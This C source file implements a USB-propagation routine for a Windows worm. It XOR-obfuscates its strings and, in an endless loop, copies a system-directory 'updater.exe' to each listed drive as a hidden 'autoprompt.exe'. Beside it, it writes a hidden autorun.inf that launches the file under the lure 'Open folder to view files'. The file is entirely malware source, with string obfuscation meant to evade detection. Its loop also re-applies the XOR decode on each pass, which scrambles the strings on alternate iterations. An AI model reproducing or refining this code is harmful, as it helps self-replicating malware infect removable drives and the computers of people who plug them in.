#include "data_globals.h"
#include <stdio.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void InfectDrives(void)
{
    char IFile[256], NewFile[256], Autorun[256], InfFile[256];
    int i;

    // "\\updater.exe" XOR'd with key 0x3E
    volatile char sz_updater[] = {
        '\\'^0x3E, 'u'^0x3E, 'p'^0x3E, 'd'^0x3E, 'a'^0x3E, 't'^0x3E, 'e'^0x3E, 'r'^0x3E,
        '.'^0x3E, 'e'^0x3E, 'x'^0x3E, 'e'^0x3E, 0x00^0x3E
    };
    // "\\autoprompt.exe" XOR'd with key 0x7A
    volatile char sz_autoprompt[] = {
        '\\'^0x7A, 'a'^0x7A, 'u'^0x7A, 't'^0x7A, 'o'^0x7A, 'p'^0x7A, 'r'^0x7A, 'o'^0x7A,
        'm'^0x7A, 'p'^0x7A, 't'^0x7A, '.'^0x7A, 'e'^0x7A, 'x'^0x7A, 'e'^0x7A, 0x00^0x7A
    };
    // "\\autorun.inf" XOR'd with key 0x1F
    volatile char sz_autorun[] = {
        '\\'^0x1F, 'a'^0x1F, 'u'^0x1F, 't'^0x1F, 'o'^0x1F, 'r'^0x1F, 'u'^0x1F, 'n'^0x1F,
        '.'^0x1F, 'i'^0x1F, 'n'^0x1F, 'f'^0x1F, 0x00^0x1F
    };
    // "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n" XOR'd with key 0x5A
    volatile char sz_content[] = {
        '['^0x5A, 'a'^0x5A, 'u'^0x5A, 't'^0x5A, 'o'^0x5A, 'r'^0x5A, 'u'^0x5A, 'n'^0x5A,
        ']'^0x5A, '\r'^0x5A, '\n'^0x5A, 'o'^0x5A, 'p'^0x5A, 'e'^0x5A, 'n'^0x5A, '='^0x5A,
        'a'^0x5A, 'u'^0x5A, 't'^0x5A, 'o'^0x5A, 'p'^0x5A, 'r'^0x5A, 'o'^0x5A, 'm'^0x5A,
        'p'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A, '\r'^0x5A, '\n'^0x5A,
        'a'^0x5A, 'c'^0x5A, 't'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '='^0x5A, 'O'^0x5A,
        'p'^0x5A, 'e'^0x5A, 'n'^0x5A, ' '^0x5A, 'f'^0x5A, 'o'^0x5A, 'l'^0x5A, 'd'^0x5A,
        'e'^0x5A, 'r'^0x5A, ' '^0x5A, 't'^0x5A, 'o'^0x5A, ' '^0x5A, 'v'^0x5A, 'i'^0x5A,
        'e'^0x5A, 'w'^0x5A, ' '^0x5A, 'f'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, 's'^0x5A,
        '\r'^0x5A, '\n'^0x5A, 0x00^0x5A
    };

    GetSystemDirectoryA(IFile, sizeof(IFile));
    xor_decrypt(sz_updater, sizeof(sz_updater), 0x3E);
    strcat(IFile, (char*)sz_updater);

    while (1) {
        for (i = 0; Inf_Drives[i]; i++) {
            memset(NewFile, 0, sizeof(NewFile));
            memset(Autorun, 0, sizeof(Autorun));
            memset(InfFile, 0, sizeof(InfFile));

            strcpy(NewFile, Inf_Drives[i]);
            strcpy(Autorun, Inf_Drives[i]);

            xor_decrypt(sz_autoprompt, sizeof(sz_autoprompt), 0x7A);
            xor_decrypt(sz_autorun, sizeof(sz_autorun), 0x1F);
            strcat(NewFile, (char*)sz_autoprompt);
            strcat(Autorun, (char*)sz_autorun);

            if (CopyFileA(IFile, NewFile, FALSE)) {
                FILE *runfile = fopen(Autorun, "wb");
                if (runfile) {
                    xor_decrypt(sz_content, sizeof(sz_content), 0x5A);
                    sprintf(InfFile, (char*)sz_content);
                    fputs(InfFile, runfile);
                    fclose(runfile);
                }
                SetFileAttributesA(NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                SetFileAttributesA(Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
            }
        }
        Sleep(5000);
    }
}
#pragma optimize("", on)
